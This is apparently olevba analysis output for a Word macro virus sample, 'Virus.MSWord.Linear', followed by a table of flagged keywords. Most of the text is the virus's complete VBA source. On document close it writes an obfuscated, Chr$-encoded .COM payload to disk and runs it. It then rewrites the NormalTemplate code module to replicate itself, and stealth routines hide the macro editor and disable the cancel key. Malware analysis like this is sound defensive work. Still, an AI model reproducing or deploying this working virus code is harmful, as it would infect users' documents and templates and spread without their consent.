olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Linear
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Linear - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
dfeha = Chr$(14) + Chr$(14) + Chr$(31) + Chr$(7) + Chr$(252) + Chr$(128) + ">" + Chr$(128) + Chr$(0) + Chr$(0) + "tX" + Chr$(190) + Chr$(130) + Chr$(0) + Chr$(191) + ""
dfeha = dfeha + Chr$(189) + Chr$(5) + Chr$(172) + Chr$(170) + "<" + Chr$(32) + Chr$(176) + Chr$(0) + "u" + Chr$(248) + "&" + Chr$(136) + "E" + Chr$(255) + Chr$(172) + Chr$(162) + ""
dfeha = dfeha + Chr$(185) + Chr$(5) + Chr$(232) + Chr$(174) + Chr$(1) + "$" + Chr$(3) + Chr$(4) + "1" + Chr$(162) + Chr$(188) + Chr$(5) + Chr$(191) + Chr$(188) + Chr$(6) + Chr$(232) + ""
dfeha = dfeha + "6" + Chr$(0) + Chr$(191) + Chr$(197) + Chr$(6) + Chr$(232) + "0" + Chr$(0) + Chr$(191) + Chr$(206) + Chr$(6) + Chr$(232) + "*" + Chr$(0) + Chr$(190) + "1"
dfeha = dfeha + Chr$(3) + Chr$(191) + Chr$(215) + Chr$(6) + Chr$(232) + ":" + Chr$(0) + Chr$(139) + Chr$(207) + Chr$(186) + Chr$(215) + Chr$(6) + "+" + Chr$(202) + "QR"
dfeha = dfeha + Chr$(186) + Chr$(189) + Chr$(5) + "3" + Chr$(201) + Chr$(180) + "<" + Chr$(205) + Chr$(33) + Chr$(147) + "ZY" + Chr$(180) + "@" + Chr$(205) + Chr$(33) + ""
dfeha = dfeha + Chr$(180) + ">" + Chr$(205) + Chr$(33) + Chr$(180) + "L" + Chr$(205) + Chr$(33) + Chr$(232) + "h" + Chr$(1) + "$" + Chr$(7) + Chr$(254) + Chr$(192) + Chr$(138) + ""
dfeha = dfeha + Chr$(200) + Chr$(232) + "_" + Chr$(1) + "$" + Chr$(15) + Chr$(4) + "a" + Chr$(170) + Chr$(254) + Chr$(201) + "u" + Chr$(244) + "2" + Chr$(192) + Chr$(170) + ""
dfeha = dfeha + Chr$(195) + Chr$(172) + "<" + Chr$(8) + "w" + Chr$(15) + Chr$(138) + Chr$(216) + "2" + Chr$(255) + Chr$(209) + Chr$(227) + Chr$(129) + Chr$(195) + Chr$(1) + Chr$(3) + ""
dfeha = dfeha + "h" + Chr$(129) + Chr$(1) + Chr$(255) + "'" + Chr$(170) + Chr$(235) + Chr$(233) + "V" + Chr$(190) + Chr$(0) + Chr$(1) + Chr$(185) + Chr$(185) + Chr$(4) + Chr$(232) + ""
dfeha = dfeha + Chr$(185) + Chr$(0) + Chr$(176) + "=" + Chr$(170) + Chr$(198) + Chr$(6) + Chr$(187) + Chr$(5) + Chr$(0) + Chr$(198) + Chr$(6) + Chr$(186) + Chr$(5) + Chr$(0) + Chr$(128) + ""
dfeha = dfeha + "<" + Chr$(33) + "r" + Chr$(8) + Chr$(198) + Chr$(6) + Chr$(187) + Chr$(5) + Chr$(1) + Chr$(176) + Chr$(34) + Chr$(170) + Chr$(172) + Chr$(232) + Chr$(199) + Chr$(0) + ""
dfeha = dfeha + "r" + Chr$(20) + Chr$(128) + ">" + Chr$(187) + Chr$(5) + Chr$(1) + "t" + Chr$(10) + "P" + Chr$(198) + Chr$(6) + Chr$(187) + Chr$(5) + Chr$(1) + Chr$(176) + ""
dfeha = dfeha + Chr$(34) + Chr$(170) + "X" + Chr$(170) + Chr$(235) + "+P" + Chr$(128) + ">" + Chr$(187) + Chr$(5) + Chr$(1) + "u" + Chr$(16) + Chr$(198) + Chr$(6) + ""
dfeha = dfeha + Chr$(187) + Chr$(5) + Chr$(0) + Chr$(128) + ">" + Chr$(186) + Chr$(5) + Chr$(0) + "t" + Chr$(4) + Chr$(184) + Chr$(34) + "+" + Chr$(171) + "f" + Chr$(184) + ""
dfeha = dfeha + "CHR$f" + Chr$(171) + Chr$(176) + "(" + Chr$(170) + "X" + Chr$(232) + Chr$(189) + Chr$(0) + Chr$(184) + ")+"
dfeha = dfeha + Chr$(171) + Chr$(254) + Chr$(6) + Chr$(186) + Chr$(5) + Chr$(128) + ">" + Chr$(186) + Chr$(5) + Chr$(15) + "v" + Chr$(28) + Chr$(232) + Chr$(155) + Chr$(0) + Chr$(232) + ""
dfeha = dfeha + Chr$(139) + Chr$(0) + Chr$(198) + Chr$(6) + Chr$(186) + Chr$(5) + Chr$(0) + Chr$(128) + ">" + Chr$(187) + Chr$(5) + Chr$(1) + "u" + Chr$(10) + Chr$(138) + Chr$(4) + ""
dfeha = dfeha + Chr$(232) + "d" + Chr$(0) + "r" + Chr$(3) + Chr$(176) + Chr$(34) + Chr$(170) + "Iu" + Chr$(145) + Chr$(232) + "|" + Chr$(0) + "^" + Chr$(195) + ""
dfeha = dfeha + "V" + Chr$(190) + Chr$(188) + Chr$(6) + Chr$(172) + Chr$(10) + Chr$(192) + "t" + Chr$(3) + Chr$(170) + Chr$(235) + Chr$(248) + "^" + Chr$(195) + Chr$(160) + Chr$(188) + ""
dfeha = dfeha + Chr$(5) + Chr$(170) + Chr$(195) + "V" + Chr$(190) + Chr$(34) + Chr$(3) + Chr$(128) + ">" + Chr$(185) + Chr$(5) + "4s" + Chr$(3) + Chr$(190) + Chr$(19) + ""
dfeha = dfeha + Chr$(3) + Chr$(172) + Chr$(10) + Chr$(192) + "t" + Chr$(3) + Chr$(170) + Chr$(235) + Chr$(248) + "^" + Chr$(195) + "V" + Chr$(190) + Chr$(197) + Chr$(6) + Chr$(235) + ""
dfeha = dfeha + Chr$(211) + Chr$(232) + "o" + Chr$(0) + "$" + Chr$(3) + Chr$(4) + "0" + Chr$(128) + ">" + Chr$(185) + Chr$(5) + "4s" + Chr$(2) + Chr$(4) + ""
dfeha = dfeha + Chr$(4) + Chr$(170) + Chr$(232) + Chr$(243) + Chr$(254) + "O" + Chr$(195) + Chr$(232) + "Y" + Chr$(0) + "<" + Chr$(127) + "s" + Chr$(5) + Chr$(184) + Chr$(13) + ""
dfeha = dfeha + Chr$(10) + Chr$(171) + Chr$(195) + Chr$(176) + ":" + Chr$(170) + Chr$(195) + "<" + Chr$(33) + "v" + Chr$(10) + "<" + Chr$(34) + "t" + Chr$(6) + "<"
dfeha = dfeha + Chr$(127) + "s" + Chr$(2) + Chr$(248) + Chr$(195) + Chr$(249) + Chr$(195) + "V" + Chr$(190) + Chr$(206) + Chr$(6) + Chr$(235) + Chr$(151) + Chr$(232) + Chr$(187) + Chr$(255) + ""
dfeha = dfeha + Chr$(176) + "=" + Chr$(170) + Chr$(232) + Chr$(181) + Chr$(255) + Chr$(176) + "+" + Chr$(170) + Chr$(195) + Chr$(176) + Chr$(34) + Chr$(170) + Chr$(128) + ">" + Chr$(187) + ""
dfeha = dfeha + Chr$(5) + Chr$(1) + "t" + Chr$(1) + Chr$(170) + Chr$(184) + Chr$(13) + Chr$(10) + Chr$(171) + Chr$(195) + "2" + Chr$(228) + Chr$(189) + Chr$(10) + Chr$(0) + Chr$(187) + ""
dfeha = dfeha + Chr$(3) + Chr$(0) + "3" + Chr$(210) + Chr$(247) + Chr$(245) + Chr$(128) + Chr$(194) + "0" + Chr$(136) + "Q" + Chr$(255) + "Ku" + Chr$(243) + Chr$(131) + ""
dfeha = dfeha + Chr$(199) + Chr$(3) + Chr$(195) + "V" + Chr$(232) + Chr$(3) + Chr$(0) + Chr$(129) + Chr$(254) + Chr$(127) + "^." + Chr$(138) + Chr$(4) + Chr$(10) + Chr$(192) + ""
dfeha = dfeha + "u" + Chr$(6) + Chr$(228) + "@" + Chr$(10) + Chr$(192) + "t" + Chr$(250) + "." + Chr$(2) + "D" + Chr$(1) + "." + Chr$(136) + Chr$(4) + "."
dfeha = dfeha + Chr$(2) + "D" + Chr$(2) + "." + Chr$(136) + "D" + Chr$(1) + Chr$(208) + Chr$(200) + "." + Chr$(136) + "D" + Chr$(2) + "2" + Chr$(228) + "^"
dfeha = dfeha + Chr$(195) + Chr$(152) + Chr$(1) + "0" + Chr$(2) + ">" + Chr$(2) + "C" + Chr$(2) + "[" + Chr$(2) + "a" + Chr$(2) + "w" + Chr$(2) + "<"
dfeha = dfeha + Chr$(2) + Chr$(151) + Chr$(2) + "NormalTemplat"
dfeha = dfeha + "e" + Chr$(0) + "ActiveDocument"
dfeha = dfeha + Chr$(0) + "private" + Chr$(32) + "sub" + Chr$(32) + "Doc"
dfeha = dfeha + "ument_Close()" + Chr$(13) + Chr$(10) + "o"
dfeha = dfeha + "n" + Chr$(32) + "error" + Chr$(32) + "resume" + Chr$(32) + "n"
dfeha = dfeha + "ext" + Chr$(13) + Chr$(10) + Chr$(0) + "open" + Chr$(32) + Chr$(34) + Chr$(1) + ".co"
dfeha = dfeha + "m" + Chr$(34) + Chr$(32) + "for" + Chr$(32) + "output" + Chr$(32) + "as"
dfeha = dfeha + Chr$(32) + Chr$(2) + Chr$(6) + "print" + Chr$(32) + "#" + Chr$(2) + "," + Chr$(4) + Chr$(6) + "cl"
dfeha = dfeha + "ose" + Chr$(32) + "#" + Chr$(2) + Chr$(6) + "rv" + Chr$(32) + "=" + Chr$(32) + "Shel"
dfeha = dfeha + "l(" + Chr$(34) + Chr$(1) + ".com" + Chr$(32) + Chr$(1) + Chr$(32) + Chr$(5) + Chr$(34) + "," + Chr$(32) + "6"
dfeha = dfeha + ")" + Chr$(6) + "kill" + Chr$(32) + Chr$(34) + Chr$(1) + ".com" + Chr$(34) + Chr$(6) + "f"
dfeha = dfeha + "or" + Chr$(32) + Chr$(8) + "=1" + Chr$(32) + "to" + Chr$(32) + "500000"
dfeha = dfeha + Chr$(6) + "next" + Chr$(6) + "open" + Chr$(32) + Chr$(34) + Chr$(1) + Chr$(34) + Chr$(32) + "f"
dfeha = dfeha + "or" + Chr$(32) + "input" + Chr$(32) + "as" + Chr$(32) + Chr$(2) + Chr$(6) + "Di"
dfeha = dfeha + "m" + Chr$(32) + Chr$(1) + Chr$(6) + Chr$(8) + "=0" + Chr$(6) + Chr$(3) + ".VBProj"
dfeha = dfeha + "ect.VBComponents"
dfeha = dfeha + "(1).CodeModule.d"
dfeha = dfeha + "eletelines" + Chr$(32) + "1,Cou"
dfeha = dfeha + "ntofLines" + Chr$(6) + "Do" + Chr$(32) + "Whi"
dfeha = dfeha + "le" + Chr$(32) + "Not" + Chr$(32) + "EOF(" + Chr$(2) + ")" + Chr$(6) + Chr$(8) + "="
dfeha = dfeha + Chr$(8) + "+1" + Chr$(6) + "Line" + Chr$(32) + "Input" + Chr$(32) + "#"
dfeha = dfeha + Chr$(2) + "," + Chr$(1) + Chr$(6) + Chr$(3) + ".VBProject."
dfeha = dfeha + "VBComponents(1)."
dfeha = dfeha + "CodeModule.inser"
dfeha = dfeha + "tlines" + Chr$(32) + Chr$(8) + "," + Chr$(1) + Chr$(6) + "Loop" + Chr$(6) + ""
dfeha = dfeha + "close" + Chr$(32) + "#" + Chr$(2) + Chr$(6) + "kill" + Chr$(32) + Chr$(34) + Chr$(1) + ""
dfeha = dfeha + Chr$(34) + Chr$(13) + Chr$(10) + "end" + Chr$(32) + "sub" + Chr$(13) + Chr$(10) + "Priv"
dfeha = dfeha + "ate" + Chr$(32) + "Sub" + Chr$(32) + "ViewVBCo"
dfeha = dfeha + "de()" + Chr$(6) + "Stealth" + Chr$(6) + "End"
dfeha = dfeha + Chr$(32) + "Sub" + Chr$(13) + Chr$(10) + "Private" + Chr$(32) + "Su"
dfeha = dfeha + "b" + Chr$(32) + "ToolsMacro()" + Chr$(6) + "S"
dfeha = dfeha + "tealth" + Chr$(6) + "End" + Chr$(32) + "Sub" + Chr$(13) + Chr$(10) + ""
dfeha = dfeha + "Private" + Chr$(32) + "Sub" + Chr$(32) + "File"
dfeha = dfeha + "Templates()" + Chr$(6) + "Stea"
dfeha = dfeha + "lth" + Chr$(6) + "End" + Chr$(32) + "Sub" + Chr$(13) + Chr$(10) + "Pri"
dfeha = dfeha + "vate" + Chr$(32) + "Sub" + Chr$(32) + "Stealth"
dfeha = dfeha + "()" + Chr$(6) + Chr$(32) + "On" + Chr$(32) + "Error" + Chr$(32) + "Res"
dfeha = dfeha + "ume" + Chr$(32) + "Next" + Chr$(13) + Chr$(10) + "Applic"
dfeha = dfeha + "ation.ShowVisual"
dfeha = dfeha + "BasicEditor" + Chr$(32) + "=" + Chr$(32) + "0" + Chr$(6) + ""
dfeha = dfeha + "Application.Enab"
dfeha = dfeha + "leCancelKey" + Chr$(32) + "=" + Chr$(32) + "0" + Chr$(13) + ""
dfeha = dfeha + Chr$(10) + "End" + Chr$(32) + "Sub" + Chr$(7) + ""
Open "o.com" For Output As 2: Print #2, dfeha
Close #2: rv = Shell("o.com o 5j", 6): Kill "o.com"
For fdfdnp = 1 To 500000: Next
Open "o" For Input As 2
Dim o: fdfdnp = 0
NormalTemplate.VBProject.VBComponents(1).CodeModule.deletelines 1, CountofLines
Do While Not EOF(2): fdfdnp = fdfdnp + 1
Line Input #2, o
NormalTemplate.VBProject.VBComponents(1).CodeModule.insertlines fdfdnp, o
Loop: Close #2
Kill "o"
End Sub
Private Sub ViewVBCode()
Stealth: End Sub
Private Sub ToolsMacro()
Stealth: End Sub
Private Sub FileTemplates()
Stealth: End Sub
Private Sub Stealth()
 On Error Resume Next
Application.ShowVisualBasicEditor = 0
Application.EnableCancelKey = 0
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

